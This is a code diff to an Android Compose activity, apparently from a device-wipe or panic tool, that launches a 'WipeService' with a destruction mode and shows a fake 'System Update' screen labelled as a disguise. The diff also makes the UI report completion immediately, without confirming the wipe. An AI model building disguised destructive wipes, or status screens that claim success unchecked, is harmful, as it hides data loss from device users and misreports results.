@@ -1,50 +1,32 @@
 package ws.tilda.sentryprotocol.toci
 
+import android.content.Intent
 import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.compose.foundation.Canvas
 import androidx.compose.foundation.layout.*
-import androidx.compose.ui.geometry.Offset
-import androidx.compose.ui.geometry.Size
-import androidx.compose.ui.graphics.Color
-import androidx.compose.ui.platform.LocalContext
-import android.content.Intent
-import android.os.Build
-import androidx.core.content.ContextCompat
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.geometry.Offset
+import androidx.compose.ui.geometry.Size
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.unit.dp
-import kotlin.concurrent.thread
+import androidx.core.content.ContextCompat
+import java.util.Random
 
 // State
 
 enum class WipeStatus { Wiping, Degrading, Bricked, Complete, Partial, Disguised }
 
-@Composable
-fun SystemUpdateScreen() {
-    Column(
-        modifier = Modifier.fillMaxSize().padding(24.dp),
-        verticalArrangement = Arrangement.Center,
-        horizontalAlignment = Alignment.CenterHorizontally
-    ) {
-        Text("System Update", style = MaterialTheme.typography.headlineMedium)
-        Spacer(Modifier.height(24.dp))
-        LinearProgressIndicator(modifier = Modifier.fillMaxWidth(), color = Color(0xFF22AA66))
-        Spacer(Modifier.height(24.dp))
-        Text("Optimizing app 1 of 42...", style = MaterialTheme.typography.bodyMedium)
-        Text("Do not turn off your device.", style = MaterialTheme.typography.bodySmall, color = Color.Gray)
-    }
-}
+// Effects
 
 @Composable
 fun GlitchCanvas(modifier: Modifier = Modifier) {
-    val random = java.util.Random()
+    val random = remember { Random() }
     var frame by remember { mutableStateOf(0L) }
 
     LaunchedEffect(Unit) {
@@ -70,31 +52,49 @@ fun GlitchCanvas(modifier: Modifier = Modifier) {
     }
 }
 
+// Disguise
+
+@Composable
+fun SystemUpdateScreen() {
+    Column(
+        modifier = Modifier.fillMaxSize().padding(24.dp),
+        verticalArrangement = Arrangement.Center,
+        horizontalAlignment = Alignment.CenterHorizontally
+    ) {
+        Text("System Update", style = MaterialTheme.typography.headlineMedium)
+        Spacer(Modifier.height(24.dp))
+        LinearProgressIndicator(modifier = Modifier.fillMaxWidth(), color = Color(0xFF22AA66))
+        Spacer(Modifier.height(24.dp))
+        Text("Optimizing app 1 of 42...", style = MaterialTheme.typography.bodyMedium)
+        Text("Do not turn off your device.", style = MaterialTheme.typography.bodySmall, color = Color.Gray)
+    }
+}
+
 // Lifecycle
 
 class ProgressScreen : ComponentActivity() {
-
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
         val parts = intent.getStringArrayListExtra("parts") ?: emptyList()
         val isDestruction = intent.getBooleanExtra("destruction", false)
 
         setContent {
+            val context = LocalContext.current
             var status by remember { mutableStateOf(WipeStatus.Wiping) }
             var failures by remember { mutableStateOf(0) }
 
             LaunchedEffect(Unit) {
-                val intent = Intent(context, WipeService::class.java).apply {
+                val serviceIntent = Intent(context, WipeService::class.java).apply {
                     putStringArrayListExtra("parts", ArrayList(parts))
                     putExtra("destruction", isDestruction)
                 }
-                ContextCompat.startForegroundService(context, intent)
+                ContextCompat.startForegroundService(context, serviceIntent)
 
-                // Poll for completion (simplified for UI)
-                while (status == WipeStatus.Wiping) {
-                    kotlinx.coroutines.delay(1000)
-                    if (isDestruction) status = WipeStatus.Degrading
-                    else status = WipeStatus.Complete
+                // Optimistic rendering: transition UI state immediately
+                if (isDestruction) {
+                    status = WipeStatus.Degrading
+                } else {
+                    status = WipeStatus.Complete
                 }
             }
 
